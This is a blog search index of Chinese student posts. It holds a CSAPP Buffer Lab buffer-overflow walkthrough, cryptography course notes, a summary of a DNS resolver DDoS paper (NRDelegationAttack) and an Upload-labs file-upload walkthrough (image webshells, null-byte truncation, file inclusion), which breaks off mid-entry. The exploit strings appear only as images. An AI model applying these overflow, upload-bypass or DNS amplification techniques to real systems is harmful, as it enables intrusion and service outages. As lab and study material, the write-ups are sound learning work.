<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>csapplab-bufferlab</title>
    <link href="/2023/10/06/csapplab-bufferlab/"/>
    <url>/2023/10/06/csapplab-bufferlab/</url>
    
    <content type="html"><![CDATA[<h2 id="Bufferlab"><a href="#Bufferlab" class="headerlink" title="Bufferlab"></a>Bufferlab</h2><h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p><p>调用者的栈帧主要包括了参数区以及返回地址。</p><p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p><ul><li>bufbomb 你所要攻击的缓冲区炸弹程序</li><li>makecookie 根据你所输入的userid生成一个cookie</li><li>hex2raw 一个生成攻击字符串的工具</li></ul><p>首先生成一个cookie供后续使用：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012161536180.png" alt="image-20231012161536180"></p><p>然后使用Ghidra将bufbomb反汇编供后续分析</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0-Candle"><a href="#阶段0-Candle" class="headerlink" title="阶段0:Candle"></a>阶段0:Candle</h3><p>在bufbomb中，通过了test()函数调用getbuf()函数</p><p>test函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">int</span> iVar3;<br>  <br>  iVar1 = uniqueval();<span class="hljs-comment">//这个函数利用进程的id作为种子生成一个伪随机数</span><br>  iVar2 = getbuf();<br>  iVar3 = uniqueval();<br>  <span class="hljs-keyword">if</span> (iVar3 == iVar1) &#123;<span class="hljs-comment">//用于验证栈是否被损坏</span><br>    <span class="hljs-keyword">if</span> (iVar2 == cookie) &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>      validate(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>getbuf：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined4 <span class="hljs-title function_">getbuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  undefined local_2c [<span class="hljs-number">40</span>];  <br>  Gets(local_2c);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>目标：让代码执行smoke（）而不是让getbuf（）返回1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163333070.png" alt="image-20231012163333070"></p><p>通过Ghidra的反汇编结果可以看到smoke函数的起始地址为08048c18</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163807613.png" alt="image-20231012163807613"></p><p>再分析getbuf的汇编代码</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012170015339.png" alt="image-20231012170015339"></p><p>可以看到，开辟了一个0x38（56）字节的栈空间，将数组的首地址放在了ebp-0x28的位置，就是说缓冲区有40个字节。</p><p>再加上返回地址和保存的旧的ebp值，此处需要构造如下攻击字段：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192005282.png" alt="image-20231012192005282"></p><p>使用hex2raw生成攻击字符串并测试</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192126197.png" alt="image-20231012192126197"></p><h3 id="阶段1-Sparkler"><a href="#阶段1-Sparkler" class="headerlink" title="阶段1: Sparkler"></a>阶段1: Sparkler</h3><p>目标：getbuf返回时跳转到fizz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> param_1)</span><br><br>&#123;<br>  <span class="hljs-keyword">if</span> (param_1 == cookie) &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>,param_1);<br>    validate(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>,param_1);<br>  &#125;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，要成功调用fizz还需要将cookie作为参数传递，在IA32中，参数是通过调用者的栈进行传递的</p><p>观察fizz的反汇编代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012194646326.png" alt="image-20231012194646326"></p><p><code>mov    0x8(%ebp),%eax</code>和 <code>cmp    0x804d108,%eax</code>这两句，将ebp+8的位置的值赋值给eax，再将eax与0x804d108的值比较，可以猜测ebp+8位置存放的就是传递的参数，而0x804d108的值为cookie</p><p>通过gdb调试验证：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200351900.png" alt="image-20231012200351900"></p><p>可以得到0x804d108的值就是cookie，那么参数就在ebp+8的位置，猜测正确</p><p>构造如下攻击字段：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195924030.png" alt="image-20231012195924030"></p><p>进行生成和测试：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195855241.png" alt="image-20231012195855241"></p><p>疑问：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200444062.png" alt="image-20231012200444062"></p><p>为什么这里也是表示的是ebp+8的位置</p><h3 id="阶段2：Firecracker"><a href="#阶段2：Firecracker" class="headerlink" title="阶段2：Firecracker"></a>阶段2：Firecracker</h3><p>目标：含有一个 bang 函数，和一个全局变量 global_value，需要注入机器代码，修改 global_value 为 cookies 的值，再调用 bang 函数。</p><p>Ghidra获得的bang函数：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012202402226.png" alt="image-20231012202402226"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012204852875.png" alt="image-20231012204852875"></p><p>通过gdb查看0x804d100的值和0x804d108（上一问得出该地址为cookie）</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012205107345.png" alt="image-20231012205107345"></p><p>所以可以构造如下攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211941649.png" alt="image-20231012211941649"></p><p>第一句movl用于修改global_value的值，第二步用于将bang压栈</p><p>获取其机器代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212046878.png" alt="image-20231012212046878"></p><p>通过gdb设置断点</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212231854.png" alt="image-20231012212231854"></p><p>此时的ebp-0x28的位置就是缓冲区的首地址，</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212311757.png" alt="image-20231012212311757"></p><p>构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212345337.png" alt="image-20231012212345337"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211925176.png" alt="image-20231012211925176"></p><h3 id="阶段3-Dynamite"><a href="#阶段3-Dynamite" class="headerlink" title="阶段3 Dynamite"></a>阶段3 Dynamite</h3><p>让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p><p>最初是test调用getbuf，前几问通过缓冲区溢出的攻击，实现了到别的函数的跳转，但不会回来继续执行test函数剩下的内容。从test函数可以看出，当收到getbuf的返回值为1时，会输出Dud，当该值为cookie时，会输出Boom！</p><p>但看getbuf函数可以知道，在函数结束后，会将eax的值设置为1然后返回</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012214342894.png" alt="image-20231012214342894"></p><p>所以构造的代码第一步要修改eax的值为cookie</p><p>而在进行缓冲区覆盖的时候，旧的ebp值会被覆盖，所以需要恢复此时的ebp值</p><p>第三步是需要进行返回地址的修改，让函数能够继续执行test函数</p><p>所以可以构造如下攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215742153.png" alt="image-20231012215742153"></p><p>转换成机器代码的步骤跟上一问一样，最后构造的攻击字段为：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215823675.png" alt="image-20231012215823675"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215723486.png" alt="image-20231012215723486"></p><h3 id="阶段4-Nitroglycerin"><a href="#阶段4-Nitroglycerin" class="headerlink" title="阶段4 Nitroglycerin"></a>阶段4 <strong>Nitroglycerin</strong></h3><p>程序运行时启用了 -n 选项时，程序在读取输入时会启用 getbufn函数(而不是前面的getbuf)。getbufn函数有与getbuf相似的功能，但前者输入数组的长度为512字节。调用getbufn函数之前，程序会先在栈上分配一个随机长度的空间，从而使得getbufn函数的栈空间在不同调用情况下不再是固定的，实际上%ebp的差值达到±240。在应用 -n 选项的情况下，程序会要求提交输入字符串 5 次，5次输入会面对5个不同的栈空间，并要求每次都成功返回cookie值。level 4的任务与level 3一致，即要求getbufn函数返回调用函数testn时返回cookie值，而不是常规的1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221107722.png" alt="image-20231012221107722"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221140589.png" alt="image-20231012221140589"></p><p>对于栈随机化的破解可以使用空操作雪橇，nop sled是在构造的机器代码之前加入nop指令（no operation的缩写，机器码位 0x90），其作用为仅将PC增加而不执行任何操作。在这种情况下，只要覆盖的地址能够指向nop序列所处的任意一个地址，就可以顺序执行nop指令，直到遇到真正构造的机器代码，这样的情况下，对于用于覆盖的返回地址的要求就降低了。</p><p>可以看到，数组的分配长度为0x208（520）个字节</p><p>解题思路：</p><p>（1）修改getbufn的返回地址至testn使其能够继续执行</p><p>（2）修改eax的值为cookie</p><p>（3）还原ebp的值，这里不能使用level3的方法，因为每次程序运行时，栈空间的位置都不一样，所以不能通过3中的方法修改固定地址，但由于每次都是执行相同的代码，那么每次执行时栈中元素的相对位置是不变的。在level3中已经分析了，旧的ebp值已经被覆盖了，因此其值没有应用价值，可以考虑通过esp的值恢复ebp的值</p><p>通过阅读testn的汇编，在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于push ebx而减去了4，再手动减去了0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。</p><p>所以构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001613439.png" alt="image-20231013001613439"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001632974.png" alt="image-20231013001632974"></p><p>最终构造的攻击代码应该有520（缓冲区长度）+4（覆盖ebp）+4（覆盖返回地址）个字节</p><p>返回地址的选择可以任意跑一次代码，查看ebp位置并-0x208得到的值，进行五次，取最高的一个，这样可以保证每次执行都会通过雪橇一路滑到目标代码进行执行</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231023163626058.png" alt="image-20231023163626058"></p><p>因为此处对于单个用户输入的id来生成cookie，作为random的种子，但random是个伪随机函数，所以对于用户来说，开辟的五次空间都是固定的。</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013010919080.png" alt="image-20231013010919080"></p><p>所以构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005138599.png" alt="image-20231013005138599"></p><p>509个nop+15个操作码+4返回地址</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005117564.png" alt="image-20231013005117564"></p>]]></content>
    
    
    <categories>
      
      <category>csapplab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CourseNote1</title>
    <link href="/2023/09/18/CourseNote1/"/>
    <url>/2023/09/18/CourseNote1/</url>
    
    <content type="html"><![CDATA[<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="加密体制分类"><a href="#加密体制分类" class="headerlink" title="加密体制分类"></a>加密体制分类</h3><p>对称加密&#x2F;非对称加密</p><p>根据攻击者知道的信息多少，可以做出分类：</p><ol><li>唯密文攻击：只知道一些密文</li><li>已知明文攻击：知道一些明文，以及对应的密文</li><li>选择明文攻击：可以选择任意明文，并通过某种方法获得对应的密文</li><li>选择密文攻击：不仅具有选择明文攻击的能力，还可以任意选择密文，并通过某种方法获得对应明文</li></ol><h3 id="随机序列"><a href="#随机序列" class="headerlink" title="随机序列"></a>随机序列</h3><p><strong>不能可靠重复产生</strong>：用完全同样的输入操作两次，得到两个不相关的序列</p><h3 id="一次一密和完善保密性"><a href="#一次一密和完善保密性" class="headerlink" title="一次一密和完善保密性"></a>一次一密和完善保密性</h3><p><img src="/2023/09/18/CourseNote1/image-20230918202339009.png" alt="image-20230918202339009"></p><p><img src="/2023/09/18/CourseNote1/image-20230918202445469.png" alt="image-20230918202445469"></p><p>完善保密性表示，即使攻击者拿到了密文c，他也无法确定是由哪个明文加密而来，因为任意一个明文加密成这个c的概率是一样的，所以若密码具有完善保密性，唯密文攻击则无效。</p><p>但为了满足完善保密性，<strong>所需要的密钥至少和明文一样长，且数量一样多</strong></p><p>证明：</p><p><img src="/2023/09/18/CourseNote1/image-20230918205530048.png" alt="image-20230918205530048"></p><h3 id="流密码和语义安全性"><a href="#流密码和语义安全性" class="headerlink" title="流密码和语义安全性"></a>流密码和语义安全性</h3><h4 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h4><p>使用伪随机密钥流代替随机密钥流</p><h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><p>利用一个短的随机密钥（称为“<strong>种子</strong>”）作为PRG的输入，由PRG产生伪随机密钥流，再与明文异或</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>设G是一个PRG，如果对于任何高效的算法，<strong>成功区分G的输出和等长的随机序列的概率都是可忽略的</strong> (计算上不可区分)，则 G是一个安全的PRG</p><h4 id="简单的事实"><a href="#简单的事实" class="headerlink" title="简单的事实"></a>简单的事实</h4><ol><li>PRG必须是不可预测的</li><li>一个PRG是安全的，则他是不可预测的；一个PRG是不可预测的，则他是安全的</li></ol><h4 id="语义安全性"><a href="#语义安全性" class="headerlink" title="语义安全性"></a>语义安全性</h4><p><img src="/2023/09/18/CourseNote1/image-20230919100728742.png" alt="image-20230919100728742"></p><p>Challenger在密钥空间K中随机选择一个密钥k，并对A发送的两个明文中的一个进行加密。Exp（0）会选择加密m0，Exp(1)会选择加密m1，A需要根据获得的密文c猜测自己处在哪个实验中。</p><p>若对于所有高效的攻击者A，其优势Adv都是可以忽略的，则该对称加密方案是语义安全的</p><h4 id="一次一密是语义安全的"><a href="#一次一密是语义安全的" class="headerlink" title="一次一密是语义安全的"></a>一次一密是语义安全的</h4><p><img src="/2023/09/18/CourseNote1/image-20230919105231090.png" alt="image-20230919105231090"></p><p>简单理解：查询后，攻击者可以获得密文c，也就相当于攻击者能通过密文与两个明文异或，得到两个“k”，若攻击者能判断哪个是用来加密的k，则能够判断是在Exp(0)还是Exp(1)中。但对于一次一密来说，k是完全随机的，产生每个k的概率相同，都是1&#x2F;K，所以Adv为0</p><h4 id="流密码是语义安全的"><a href="#流密码是语义安全的" class="headerlink" title="流密码是语义安全的"></a>流密码是语义安全的</h4><p><img src="/2023/09/18/CourseNote1/image-20230919105611996.png" alt="image-20230919105611996"></p><p>因为对于一个安全的PRG，其产生的G(k)与r在计算上是不可取分的，所以利用传递性得证</p><h2 id="数论基础"><a href="#数论基础" class="headerlink" title="数论基础"></a>数论基础</h2><ul><li>任意一个正整数a&gt;1，总可以分解为一系列素数乘积的形式，而且分解形式是唯一的</li><li>素性检测：随机产生一个大奇数，然后检测它是不是素数（Miller-Rabin算法）</li></ul>]]></content>
    
    
    <categories>
      
      <category>Course</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NRDelegationAttack</title>
    <link href="/2023/09/11/NRDelegationAttack/"/>
    <url>/2023/09/11/NRDelegationAttack/</url>
    
    <content type="html"><![CDATA[<h2 id="NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）"><a href="#NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）" class="headerlink" title="NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）"></a>NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）</h2><p>论文的主题为针对 DNS 递归解析器的 DDoS 攻击。该工作由来自 Tel-Aviv University （以色列特拉维夫大学） 的 DEEPNESS Lab 的研究人员完成。</p><p>利用系统在应对不利条件或异常情况时的性能瓶颈和漏洞，从而有意或恶意地导致系统资源的不合理使用或耗尽。</p><p>Referral response: 引荐响应，是指在计算机网络中，特别是在DNS（域名系统）中，一个服务器向另一个服务器提供关于如何解析特定查询的信息的响应。这种响应告诉请求服务器应该将查询转发到哪个其他服务器来获取所需的信息。</p><p>在DNS中，引荐响应通常是由权威DNS服务器提供的。当一个DNS服务器收到一个查询，但它不拥有与该查询相关的信息时，它可以向请求服务器返回一个引荐响应，指示请求服务器将查询发送到另一个DNS服务器，通常是更高级别的DNS服务器，以获取所需的信息。这个过程可以追溯到根DNS服务器，以便最终找到与查询相关的IP地址或其他资源记录。</p><h4 id="Glue-record"><a href="#Glue-record" class="headerlink" title="Glue record"></a>Glue record</h4><p>普通的DNS记录是保存在权威服务器上的，胶水记录是保存在注册局的DNS服务器上的</p><p>简述一个DNS查询流程：若要查询jd.com</p><ol><li>获取根服务器列表</li><li>向根服务器发送查询（“请问你有jd.com吗？” “没有，但你可以找.com问问，我正好有他们的ip地址，顺带给你吧”）</li><li>向.com权威服务器发送查询（“请问你有jd.com吗” “没有，但你可以找管理jd.com的服务器问问，我正好有他们的ip地址，给你吧”）</li><li>向jd.com域名权威服务器发送查询（“请问你有jd.com吗” “有的，给你吧”）</li></ol><p>在查询过程中，2，3步返回的结果中，顺带给的ip地址就是胶水记录，若没有，则需要<strong>额外的查询去获得ip地址</strong>（递归解析器开启主动解析进程，每个名称服务器启动一个独立的递归状态，查询权威服务器提供的全部名称服务器的ip地址，此过程将消耗大量的服务器资源）</p><p>同时，假设在自建服务器中，example.com使用ns1.example.com和ns2.example.com作为权威服务器</p><p>为了解析example.com，若没有胶水记录，则无法知道ns1.example和ns2.example.com的ip，那么为了解析ns1.example.com的地址，又需要解析example.com，从而陷入循环</p><h4 id="NXNSAttack攻击"><a href="#NXNSAttack攻击" class="headerlink" title="NXNSAttack攻击"></a>NXNSAttack攻击</h4><p>通过向某一递归解析器查询攻击者的权威服务器授权域名的子域名发起大量查询请求，致使攻击者的恶意查询流量在解析过程中被放大，最终导致递归解析器与受害者域名的权威域名服务器遭受拒绝服务攻击。</p><p>威胁模型：</p><p>NXNSAttack的攻击者拥有一个二级域名，如attack.com并维护其权威服务器，并且可以为该域配置大量不同的子域名</p><p>为这些子域名设置NS记录，将这些子域名的解析授权到受害者域名，如victim.com的多个不存在的子域名的权威服务器，这些子域名实际上不存在victim.com的DNS配置中</p><p>攻击流程：</p><p><img src="/2023/09/11/NRDelegationAttack/image-20230914150452417.png" alt="image-20230914150452417"></p><ol><li>攻击者向其维护的一个子域名ns1.attacker.com发起DNS查询请求，攻击者每次查询会使用不同的子域名，以此来绕过递归解析器的缓存机制</li><li>攻击者请求会到达attack.com的权威服务器，并返回提前设置好的DNS响应，其中包含大量的NS记录，这些记录指向受害者域下的不存在的子域名，而且不包含glue记录，即不会包含这些子域名的ip地址</li><li>当递归解析器收到大量包含NS记录的响应后，会尝试解析这些NS记录，以确定每个名称服务器的ip地址。为了完成这个任务，解析器就会向victim.com的权威服务器发送大量的NS解析请求</li><li>但由于这些子域名并不存在，受害者域的权威服务器就回返回NX响应（Name Error）</li><li>由于递归解析器不断地发起NS解析请求，而受害者域的权威服务器始终返回NX响应，就会占用服务器资源，最终导致递归解析器和受害者域名的权威服务器遭受拒绝服务攻击，无法响应正常的DNS请求。</li></ol><h4 id="缓解策略：MaxFetch-k"><a href="#缓解策略：MaxFetch-k" class="headerlink" title="缓解策略：MaxFetch(k)"></a>缓解策略：MaxFetch(k)</h4><p>具体步骤：</p><ol><li>对于每一个请求中的1个或k个名称服务器进行解析，而不是在NS记录响应到达递归解析器时，一次性查询该区的全部名称服务器ip</li><li>收到用户请求时，如果请求的是已经解析过的名称服务器时，解析器会解析另外k个名称服务器的ip地址</li><li>解析过程一直持续到权威返回的NS记录响应中提供的所有NS记录被解析</li></ol><p>例如，在BIND9的实现中，k为5，在收到包含许多NS名称的引用响应时，BIND9只解析5个，如果所有的解析都反回NXDOMAIN（域名不存在或无法解析），则解析终止并向客户端返回NY响应。</p><h4 id="攻击利用的四个DNS机制"><a href="#攻击利用的四个DNS机制" class="headerlink" title="攻击利用的四个DNS机制"></a>攻击利用的四个DNS机制</h4><h5 id="Slist"><a href="#Slist" class="headerlink" title="Slist"></a>Slist</h5><p>“SLIST” 机制在 RFC-1034 中提出。它在解析器实现中用作临时存储器，用于记录在处理客户端查询时执行的每个中间名称服务器解析的状态。在 BIND9 中其被实现为 address-DB (ADB) 。当递归解析器接收到响应中没有包含 NS 记录的 IP 地址的响应时，其将 NS 记录保存在 ADB 中，并启动新的 DNS 查询来收集这些 NS 服务器的 A 记录。</p><h5 id="Delegation-Response"><a href="#Delegation-Response" class="headerlink" title="Delegation Response"></a>Delegation Response</h5><p>要回答解析器的查询请求，权威服务器可以决定将解析工作委托给另一个名称服务器。例如图 2 中，example1.com 将 e1.example.com 的解析委托给 www1.example2.com ，或者当解析器获得引用响应（Referral Response, RR） 时，就会发生这种情况。</p><h5 id="Referral-Reponse-Limit"><a href="#Referral-Reponse-Limit" class="headerlink" title="Referral Reponse Limit"></a>Referral Reponse Limit</h5><p>即上文提到过的缓解措施，当查询达到限制时，将设置一个特殊标志，No_Fetch</p><h5 id="Restart-Event"><a href="#Restart-Event" class="headerlink" title="Restart Event"></a>Restart Event</h5><p>在许多情况下，解析器中的解析过程被委托给不同的名称服务器，在这种情况下，它将重新启动并在新的名称服务器上继续解析。被重定向到的“新权威”服务器将会被记录在 ADB 中。</p><p>在restart时，解析器会清除和重置一些标识位，其中包括为了缓解 NXNSAttack 引入的No_Fetch标识位，其用来限制解析器每次查询的NS数量，当No_Fetch为1时，将终止本次解析。</p><h4 id="NRDelegation-Attack威胁模型"><a href="#NRDelegation-Attack威胁模型" class="headerlink" title="NRDelegation Attack威胁模型"></a>NRDelegation Attack威胁模型</h4><h5 id="攻击条件："><a href="#攻击条件：" class="headerlink" title="攻击条件："></a>攻击条件：</h5><ol><li>一个或多个可以发起恶意查询的客户端</li><li>一个可以产生特定referral response的可控权威服务器</li><li>不响应DNS查询的服务器列表或ip地址</li></ol><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p><img src="/2023/09/11/NRDelegationAttack/image-20230914163958837.png" alt="image-20230914163958837"></p><p><strong>阶段1</strong></p><ol><li>攻击者发起恶意查询，xyz.referral.com</li><li>受害者解析器向攻击者控制的权威服务器查询referral.com</li><li>referral.com回复一个大型引用响应</li></ol><p><strong>阶段2</strong></p><ol start="4"><li>解析器首先遍历ADB和缓存，查看这些NS是否已经被查询过，因为存在A和AAAA两种记录（IPv4和IPv6），所以会查询2n次</li><li>解析器没有找到NS的有效信息，就回发起解析，由于Referral Response Limit的存在，每次只查询k个</li></ol><p>攻击者利用可控的权威名称服务器返回没有胶水记录的超长的referral response（大小设为 n ）。根据解析器软件的实现（文中主要针对 BIND9 的实现），解析器首先将遍历 ADB 和缓存，查看这些 NS 是否之前查询过，因为存在 A 和 AAAA 两种记录，所以会查询2n次，这是 NRDelegationAttack 的主要成因之一，<strong>每次的遍历耗费了服务器大量的计算资源</strong>。当解析器没有找到 NS 的有效信息，则会对这些 NS 发起解析，由于Referral Response Limit限制的存在，因此，解析器每次仅查询有限的 k 个 NS。</p><p><strong>阶段3</strong></p><p>当解析器查询referral response中的NS时，将被引导至权威服务器，并触发委托响应，这时候restart事件被激活，No_Fetch标识符被清除，重新开启第4步，<strong>重新检查ADB和缓存</strong>。由于攻击者设置的是不响应 DNS 查询的服务器，因此，这些无法获取到这些NS的有效信息，因此，无法在ADB 中更新这些 NS 的信息。所以步骤 10 只有到达解析器的安全限制计数器的上限才会停止，BIND9 中这个上限为 100。该上限对攻击者来说已经可以完成攻击了。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs2</title>
    <link href="/2023/09/07/Upload-labs2/"/>
    <url>/2023/09/07/Upload-labs2/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907100705175.png" alt="image-20230907100705175"></p><p><code>$img_path = $_GET[&#39;save_path&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $file_ext;</code>：构建一个新的文件路径，包括文件名和扩展名。这个路径基于名为 <code>&#39;save_path&#39;</code> 的 GET 参数，以及一个随机数、日期时间戳和文件扩展名。所以可以采用%00进行截断</p><h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907104811944.png" alt="image-20230907104811944"></p><p>这题变成了 <code>$_POST[&#39;save_path&#39;]</code> ，POST方式不会像GET方式一样，提交经过URL编码，所以进行截断需要手动修改二进制流</p><h4 id="Pass-13，14，15"><a href="#Pass-13，14，15" class="headerlink" title="Pass-13，14，15"></a>Pass-13，14，15</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907151043164.png" alt="image-20230907151043164"></p><p>创建图片马：</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150642263.png" alt="image-20230907150642263"></p><p>抓包记录上传位置</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150615706.png" alt="image-20230907150615706"></p><p>通过题目给出的文件包含漏洞访问，可以看到正确返回了木马中的phpinfo()内容</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150559242.png" alt="image-20230907150559242"></p><h4 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907153602463.png" alt="image-20230907153602463"></p><p>发现会对图片进行二次渲染，则之前使用的图片码无法使用，因为加在图片后的php代码会被渲染，从而无法正确执行</p><p>所以可以上传一张图片，对比看被二次渲染过的图片有什么地方是没变的，可以将php代码插入其中（通常文件头是不会被修改的，但修改文件头可能会导致文件损坏）</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163747679.png" alt="image-20230907163747679"></p><p>左边是修改过的gif，右边是上传之后重新下载的gif，可以看到php代码被成功的添加</p><p>用上一题同样的方法访问</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163902487.png" alt="image-20230907163902487"></p><p>通过文件包含漏洞，代码被成功执行</p><h4 id="Pass-17，18条件竞争"><a href="#Pass-17，18条件竞争" class="headerlink" title="Pass-17，18条件竞争"></a>Pass-17，18条件竞争</h4><p><img 